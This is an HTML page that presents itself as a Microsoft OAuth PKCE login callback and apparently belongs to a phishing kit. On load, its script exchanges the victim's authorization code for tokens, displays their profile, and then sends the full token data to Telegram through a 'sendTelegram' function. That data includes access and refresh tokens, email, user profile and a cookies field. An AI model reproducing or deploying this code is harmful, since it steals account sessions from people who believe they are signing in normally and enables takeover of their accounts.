<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PKCE OAuth Callback - Processing...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 600px;
            width: 100%;
            text-align: center;
        }
        .logo {
            width: 60px;
            height: 60px;
            background: #0078d4;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            font-weight: bold;
        }
        .status {
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            font-weight: bold;
        }
        .status.processing {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .user-info {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
        }
        .user-info h3 {
            margin: 0 0 15px 0;
            color: #0078d4;
        }
        .data-item {
            margin: 8px 0;
            padding: 8px 12px;
            background: white;
            border-radius: 4px;
            border-left: 3px solid #0078d4;
        }
        .data-label {
            font-weight: bold;
            color: #333;
        }
        .data-value {
            color: #666;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        .debug-section {
            background: #f5f5f5;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            font-size: 12px;
        }
        .debug-section h4 {
            margin: 0 0 10px 0;
            color: #666;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">M</div>
        <h1>PKCE OAuth Callback</h1>
        
        <div class="spinner"></div>
        <div id="status" class="status processing">
            üîÑ Processing PKCE OAuth callback...
        </div>
        
        <div id="userInfo" style="display: none;"></div>
        <div id="debugInfo" style="display: none;"></div>
    </div>

    <script>
        console.log('üîç PKCE Callback page loaded');
        console.log('üîç URL:', window.location.href);
        
        // Process the OAuth callback immediately
        window.addEventListener('load', async () => {
            await handlePKCECallback();
        });
        
        async function handlePKCECallback() {
            const statusDiv = document.getElementById('status');
            const userInfoDiv = document.getElementById('userInfo');
            const debugInfoDiv = document.getElementById('debugInfo');
            
            try {
                // Parse URL parameters
                const urlParams = new URLSearchParams(window.location.search);
                const code = urlParams.get('code');
                const state = urlParams.get('state');
                const error = urlParams.get('error');
                const errorDescription = urlParams.get('error_description');
                
                console.log('üîç OAuth callback parameters:', {
                    hasCode: !!code,
                    state: state,
                    error: error
                });
                
                // Check for OAuth errors
                if (error) {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = `‚ùå OAuth Error: ${error}<br>${errorDescription}`;
                    return;
                }
                
                // Validate authorization code
                if (!code) {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '‚ùå No authorization code received';
                    return;
                }
                
                // Retrieve PKCE parameters from sessionStorage
                const storedCodeVerifier = sessionStorage.getItem('pkce_code_verifier');
                const storedState = sessionStorage.getItem('pkce_state');
                
                console.log('üîç Stored PKCE parameters:', {
                    hasCodeVerifier: !!storedCodeVerifier,
                    storedState: storedState,
                    receivedState: state
                });
                
                // Validate state parameter
                if (!storedState || storedState !== state) {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '‚ùå Invalid state parameter - possible CSRF attack';
                    return;
                }
                
                // Validate code_verifier
                if (!storedCodeVerifier) {
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = '‚ùå No code_verifier found - PKCE flow incomplete';
                    return;
                }
                
                statusDiv.innerHTML = 'üîÑ PKCE validation successful - exchanging code for tokens...';
                
                // Perform token exchange with PKCE
                const currentDomain = window.location.origin;
                const tokenResponse = await fetch(`${currentDomain}/.netlify/functions/tokenExchange`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        code: code,
                        redirect_uri: 'https://vaultydocs.com/pkce-callback',
                        code_verifier: storedCodeVerifier
                    })
                });
                
                const tokenResult = await tokenResponse.json();
                console.log('üîç Token exchange result:', tokenResult);
                
                if (tokenResult.success) {
                    // Success - display user information
                    statusDiv.className = 'status success';
                    statusDiv.innerHTML = '‚úÖ PKCE OAuth login successful!';
                    
                    // Display user information
                    userInfoDiv.style.display = 'block';
                    userInfoDiv.innerHTML = `
                        <div class="user-info">
                            <h3>üë§ User Information</h3>
                            <div class="data-item">
                                <div class="data-label">Email:</div>
                                <div class="data-value">${tokenResult.email}</div>
                            </div>
                            <div class="data-item">
                                <div class="data-label">Email Source:</div>
                                <div class="data-value">${tokenResult.emailSource}</div>
                            </div>
                            <div class="data-item">
                                <div class="data-label">Display Name:</div>
                                <div class="data-value">${tokenResult.user?.displayName || 'N/A'}</div>
                            </div>
                            <div class="data-item">
                                <div class="data-label">User ID:</div>
                                <div class="data-value">${tokenResult.user?.id || 'N/A'}</div>
                            </div>
                            <div class="data-item">
                                <div class="data-label">Identity Provider:</div>
                                <div class="data-value">${tokenResult.user?.identityProvider || 'Microsoft'}</div>
                            </div>
                            <div class="data-item">
                                <div class="data-label">Tenant ID:</div>
                                <div class="data-value">${tokenResult.user?.tenantId || 'N/A'}</div>
                            </div>
                        </div>
                    `;
                    
                    // Display debug information
                    debugInfoDiv.style.display = 'block';
                    debugInfoDiv.innerHTML = `
                        <div class="debug-section">
                            <h4>üîç Debug Information</h4>
                            <div><strong>Token Exchange Flow:</strong> ${tokenResult.debug?.tokenExchangeFlow}</div>
                            <div><strong>Email Extraction Path:</strong> ${tokenResult.debug?.emailExtractionPath?.join(' ‚Üí ')}</div>
                            <div><strong>ID Token Available:</strong> ${!!tokenResult.debug?.idTokenClaims}</div>
                            <div><strong>Graph Profile Available:</strong> ${!!tokenResult.debug?.graphProfile}</div>
                            <div><strong>Has Access Token:</strong> ${!!tokenResult.tokens?.access_token}</div>
                            <div><strong>Has Refresh Token:</strong> ${!!tokenResult.tokens?.refresh_token}</div>
                            <div><strong>Offline Access:</strong> ${tokenResult.tokens?.offline_access}</div>
                        </div>
                    `;
                    
                    // Send to Telegram
                    await sendToTelegram(tokenResult);
                    
                    // Clean up sessionStorage
                    sessionStorage.removeItem('pkce_code_verifier');
                    sessionStorage.removeItem('pkce_state');
                    
                } else {
                    // Token exchange failed
                    statusDiv.className = 'status error';
                    statusDiv.innerHTML = `‚ùå Token exchange failed: ${tokenResult.error}`;
                    
                    if (tokenResult.hint) {
                        statusDiv.innerHTML += `<br>üí° Hint: ${tokenResult.hint}`;
                    }
                    
                    // Show debug info for troubleshooting
                    debugInfoDiv.style.display = 'block';
                    debugInfoDiv.innerHTML = `
                        <div class="debug-section">
                            <h4>‚ùå Error Details</h4>
                            <div><strong>Error Code:</strong> ${tokenResult.errorCode || 'N/A'}</div>
                            <div><strong>Details:</strong> ${tokenResult.details || 'N/A'}</div>
                            <div><strong>Authorization Code:</strong> ${code.substring(0, 50)}...</div>
                            <div><strong>Code Verifier Available:</strong> ${!!storedCodeVerifier}</div>
                        </div>
                    `;
                }
                
            } catch (error) {
                console.error('‚ùå PKCE callback error:', error);
                statusDiv.className = 'status error';
                statusDiv.innerHTML = `‚ùå Callback processing error: ${error.message}`;
            }
        }
        
        // Send successful login data to Telegram
        async function sendToTelegram(tokenResult) {
            try {
                console.log('üì§ Sending PKCE login data to Telegram...');
                
                const currentDomain = window.location.origin;
                const telegramResponse = await fetch(`${currentDomain}/.netlify/functions/sendTelegram`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        domain: currentDomain,
                        email: tokenResult.email,
                        sessionId: 'pkce_' + Date.now(),
                        authorizationCode: 'PKCE_SUCCESS',
                        hasAuthCode: true,
                        provider: 'Microsoft PKCE',
                        tokenData: tokenResult,
                        userProfile: tokenResult.user,
                        formattedCookies: [],
                        timestamp: new Date().toISOString()
                    })
                });
                
                if (telegramResponse.ok) {
                    const result = await telegramResponse.json();
                    console.log('‚úÖ Successfully sent to Telegram:', result);
                } else {
                    console.log('‚ö†Ô∏è Failed to send to Telegram:', telegramResponse.status);
                }
                
            } catch (telegramError) {
                console.error('‚ùå Telegram send error:', telegramError);
            }
        }
    </script>
</body>
</html>
